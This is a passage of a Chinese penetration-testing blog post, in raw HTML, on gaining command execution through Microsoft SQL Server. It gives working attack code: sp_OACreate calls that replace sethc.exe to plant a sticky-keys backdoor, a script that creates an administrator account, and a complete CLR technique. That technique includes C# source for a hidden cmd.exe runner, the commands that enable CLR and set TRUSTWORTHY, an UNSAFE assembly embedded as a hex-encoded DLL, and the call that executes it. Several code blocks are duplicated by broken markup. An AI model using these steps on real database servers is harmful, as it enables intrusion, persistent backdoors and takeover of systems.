class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">&#x27;copyfile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\explorer.exe&#x27;</span>, <span class="hljs-string">&#x27;c:\windows\system32\sethc.exe&#x27;</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@oo</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@oo</span> i<span class="hljs-operator">=</span><span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@oo</span>,<span class="hljs-string">&#x27;copyfile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\sethc.exe&#x27;</span>,<span class="hljs-string">&#x27;c:\windows\system32\dllcache\sethc.exe&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>创建账号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">EXEC</span> sp_OACreate <span class="hljs-string">&#x27;ScriptControl&#x27;</span>,<span class="hljs-variable">@js</span> <span class="hljs-keyword">OUT</span><br><span class="hljs-keyword">EXEC</span> sp_OASetProperty <span class="hljs-variable">@js</span>,<span class="hljs-string">&#x27;Language&#x27;</span>, &quot;Javascript&#x27;<br>EXEC sp_OAMethod @js,&#x27;Eval&#x27;, NULL,<br>var o=new Activexobject(&quot;Shel1.Users&quot;);<br>Z=o.create(&quot;TUER SERVER&quot;);<br>z.changePassword( &quot;<span class="hljs-number"><code class="language-hljs sql"><span class="hljs-keyword">EXEC</span> sp_OACreate <span class="hljs-string">&#x27;ScriptControl&#x27;</span>,<span class="hljs-variable">@js</span> <span class="hljs-keyword">OUT</span><br><span class="hljs-keyword">EXEC</span> sp_OASetProperty <span class="hljs-variable">@js</span>,<span class="hljs-string">&#x27;Language&#x27;</span>, &quot;Javascript&#x27;<br>EXEC sp_OAMethod @js,&#x27;Eval&#x27;, NULL,<br>var o=new Activexobject(&quot;Shel1.Users&quot;);<br>Z=o.create(&quot;TUER SERVER&quot;);<br>z.changePassword( &quot;<span class="hljs-number">1234567</span>",""）;<br>z.setting( "AccountType")=3;";<br></code></pre></td></tr></table></figure>



<h2 id="0x1-3-CLR"><a href="#0x1-3-CLR" class="headerlink" title="0x1.3 CLR"></a>0x1.3 CLR</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-ver15</a></p>
<blockquote>
<p>Microsoft SQL Server和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-CN/azure/sql-database/sql-database-managed-instance-index">Azure SQL 托管实例</a>使你能够使用本机公共语言运行时 (CLR) 集成实现 .NET 语言的某些功能，SQL Server服务器端模块 (过程、函数和触发器) 。 CLR 为托管代码提供服务，例如跨语言集成、代码访问安全性、对象生存期管理以及调试和分析支持。 对于SQL Server用户和应用程序开发人员，CLR 集成意味着你现在可以编写存储过程、触发器、用户定义的类型、用户定义的函数 (标量和表值) ，以及使用任何.NET Framework语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）的用户定义聚合函数。 SQL Server包括预安装.NET Framework版本 4。</p>
</blockquote>
<p>可以简单理解为MSSQL的扩展，相当于编程语言的类库。</p>
<ul>
<li>编写测试代码，用VS选择SQL Server数据库项目 -&gt; 创建SQL CLR C# 存储过程</li>
</ul>
<blockquote>
<p>修改目标平台和勾选创建脚本</p>
<p>修改目标框架和权限级别，donet版本，权限级别UNSAFE</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre class=" language-hljs c#"><code class="language-hljs c#">using System;<br>using System.Data;<br>using System.Data.SqlClient;<br>using System.Data.SqlTypes;<br>using System.Diagnostics;<br>using System.Text;<br>using Microsoft.SqlServer.Server;<br><br>public partial class StoredProcedures<br>&#123;<br>    [Microsoft.SqlServer.Server.SqlProcedure]<br>    public static void ExecCommand (string cmd)<br>    &#123;<br>        // 在此处放置代码<br>        SqlContext.Pipe.Send("Command is running, please wait.");<br>        SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));<br>    &#125;<br>    public static string RunCommand(string filename,string arguments)<br>    &#123;<br>        var process = new Process();<br><br>        process.StartInfo.FileName = filename;<br>        if (!string.IsNullOrEmpty(arguments))<br>        &#123;<br>            process.StartInfo.Arguments = arguments;<br>        &#125;<br><br>        process.StartInfo.CreateNoWindow = true;<br>        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;<br>        process.StartInfo.UseShellExecute = false;<br><br>        process.StartInfo.RedirectStandardError = true;<br>        process.StartInfo.RedirectStandardOutput = true;<br>        var stdOutput = new StringBuilder();<br>        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);<br>        string stdError = null;<br>        try<br>        &#123;<br>            process.Start();<br>            process.BeginOutputReadLine();<br>            stdError = process.StandardError.ReadToEnd();<br>            process.WaitForExit();<br>        &#125;<br>        catch (Exception e)<br>        &#123;<br>            SqlContext.Pipe.Send(e.Message);<br>        &#125;<br><br>        if (process.ExitCode == 0)<br>        &#123;<br>            SqlContext.Pipe.Send(stdOutput.ToString());<br>        &#125;<br>        else<br>        &#123;<br>            var message = new StringBuilder();<br><br>            if (!string.IsNullOrEmpty(stdError))<br>            &#123;<br>                message.AppendLine(stdError);<br>            &#125;<br><br>            if (stdOutput.Length != 0)<br>            &#123;<br>                message.AppendLine("Std output:");<br>                message.AppendLine(stdOutput.ToString());<br>            &#125;<br>            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);<br>        &#125;<br>        return stdOutput.ToString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<ul>
<li>启用MSSQL CLR功能</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs sql">sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>, <span class="hljs-number"><code class="language-hljs sql">sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br></code></pre></td></tr></table></figure>

<ul>
<li>将数据库标记为安全</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">ALTER</span> DATABASE master <span class="hljs-keyword">SET</span> TRUSTWORTHY <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">ALTER</span> DATABASE master <span class="hljs-keyword">SET</span> TRUSTWORTHY <span class="hljs-keyword">ON</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li>导入不安全的程序集，将DLL转为16进制</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">CREATE</span> ASSEMBLY [Database1]<br>    <span class="hljs-keyword">AUTHORIZATION</span> [dbo]<br>    <span class="hljs-keyword">FROM</span> <span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br>    <span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator"><code class="language-hljs sql"><span class="hljs-keyword">CREATE</span> ASSEMBLY [Database1]<br>    <span class="hljs-keyword">AUTHORIZATION</span> [dbo]<br>    <span class="hljs-keyword">FROM</span> <span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br>    <span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE;<br>GO<br></code></pre></td></tr></table></figure>

<ul>
<li>创建存储过程</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> [dbo].[ExecCommand]<br><span class="hljs-variable">@cmd</span> NVARCHAR (MAX)<br><span class="hljs-keyword">AS</span> <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> [dbo].[ExecCommand]<br><span class="hljs-variable">@cmd</span> NVARCHAR (MAX)<br><span class="hljs-keyword">AS</span> <span class="hljs-keyword">EXTERNAL</span> NAME [Database1].[StoredProcedures].[ExecCommand]<br>go<br></code></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">exec</span> dbo.ExecCommand "whoami";<br></code></pre></td></tr></table></figure>





<h2 id="0x1-4-沙盒"><a href="#0x1-4-沙盒" class="headerlink" title="0x1.4 沙盒"></a>0x1.4 沙盒</h2><ul>
<li>开启沙盒</li>
</ul>
